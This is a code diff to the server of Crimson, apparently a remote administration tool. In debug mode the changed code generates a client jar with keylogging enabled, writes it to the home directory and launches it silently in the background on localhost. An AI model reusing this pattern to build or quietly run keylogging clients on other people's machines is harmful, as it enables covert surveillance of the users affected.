@@ -35,6 +35,7 @@ import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
 import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
 import com.subterranean_security.crimson.core.proto.Misc.AuthMethod;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
+import com.subterranean_security.crimson.core.proto.Misc.Outcome;
 import com.subterranean_security.crimson.core.storage.ServerDB;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.EH;
@@ -84,7 +85,7 @@ public final class Server {
 		ServerStore.Listeners.start();
 
 		if (Common.isDebugMode() && !ServerState.isCloudMode() && !ServerState.isExampleMode()) {
-			generateDebugInstaller();
+			installDebugClient();
 		}
 
 		parse();
@@ -111,30 +112,50 @@ public final class Server {
 
 	}
 
-	private static void generateDebugInstaller() {
+	/**
+	 * Generate and install a debug client on the localhost
+	 * 
+	 * @return Operation outcome
+	 */
+	private static Outcome installDebugClient() {
 
-		ServerStore.Authentication.create(AuthMethod.newBuilder().setCreation(new Date().getTime())
-				.setType(AuthType.GROUP).setId(0).setName("TESTGROUP").setGroupSeedPrefix("gfdgdf").build());
+		Outcome.Builder outcome = Outcome.newBuilder().setResult(true);
+
+		// Use group authentication
+		Outcome authOutcome = ServerStore.Authentication
+				.create(AuthMethod.newBuilder().setCreation(new Date().getTime()).setType(AuthType.GROUP).setId(0)
+						.setName("TESTGROUP").setGroupSeedPrefix(CUtil.Misc.randString(5)).build());
+
+		if (!authOutcome.getResult()) {
+			return authOutcome;
+		}
 
 		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.GROUP)
 				.setGroupName("TESTGROUP")
 				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
-				.setPathWin("C:\\Users\\dev\\Documents\\Crimson").setPathBsd("/").setPathLin("/home/dev/cr")
-				.setPathOsx("/").setPathSol("/").setReconnectPeriod(3000).setBuildNumber(Common.build)
-				.setAutostart(false).setKeylogger(true).setKeyloggerFlushMethod(FLUSH_METHOD.EVENT)
-				.setKeyloggerFlushValue(15).build();
+				.setPathWin("C:\\Users\\" + System.getProperty("user.name") + "\\Documents\\Crimson").setPathBsd("/")
+				.setPathLin("/home/dev/cr").setPathOsx("/").setPathSol("/").setReconnectPeriod(3000)
+				.setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
+				.setKeyloggerFlushMethod(FLUSH_METHOD.EVENT).setKeyloggerFlushValue(15).build();
 		try {
+			// Generate installer
 			Generator g = new Generator();
 			g.generate(cc);
+
+			// Write installer
 			byte[] res = g.getResult();
-			CUtil.Files.writeFile(res, new File(System.getProperty("user.home") + "/Desktop/client.jar"));
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			File installer = new File(System.getProperty("user.home") + "/client.jar");
+			CUtil.Files.writeFile(res, installer);
+
+			// Run installer
+			CUtil.Misc.runBackgroundCommand("javaw -jar \"" + installer.getAbsolutePath() + "\"");
+
 		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			log.error("Failed to generate debug installer");
+			outcome.setResult(false).setComment(e.getMessage());
 		}
+
+		return outcome.build();
 	}
 
 	// TODO move into a config class
